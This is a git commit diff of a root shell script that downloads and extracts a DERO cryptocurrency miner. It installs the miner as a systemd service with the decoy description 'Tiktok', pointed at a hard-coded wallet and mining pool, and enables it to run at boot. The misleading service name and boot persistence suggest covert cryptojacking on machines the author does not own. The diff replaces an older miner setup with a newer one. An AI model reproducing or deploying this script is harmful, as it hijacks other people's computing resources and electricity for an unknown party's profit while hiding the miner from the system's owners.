cc2bba5c26525ea55ec07da328495e1b6972dc9b
claudiaeliza1912 <126445871+claudiaeliza1912@users.noreply.github.com>
2023-03-28 01:42:17 +0700

    Update aaaa.sh

--- aaaa.sh
+++ aaaa.sh
@@ -1,8 +1,8 @@
 cd /home
-sudo wget https://github.com/deroproject/derohe/releases/download/Release114/dero_linux_amd64.tar.gz
+sudo wget https://github.com/dero-am/astrobwt-miner/releases/download/V1.9/astrominer-V1.9_modern_amd64_linux.tar.gz
 sudo apt update
-sudo tar xvzf dero_linux_amd64.tar.gz
-sudo bash -c 'echo -e "[Unit]\nDescription=Tiktok\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/dero_linux_amd64/dero-miner-linux-amd64 --wallet-address deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xmx50ny2fyrcths7s0jwk --daemon-rpc-address=3.93.17.174:10100\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/deroz.service'
+sudo tar xvzf astrominer-V1.9_modern_amd64_linux.tar.gz
+sudo bash -c 'echo -e "[Unit]\nDescription=Tiktok\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/astrominer -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92x6vrhm75m8f6tqs8dfaq7 -r community-pools.mysrv.cloud:10300\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/deroz.service'
 sudo systemctl daemon-reload
 sudo systemctl enable deroz.service
 echo "Setup completed!"
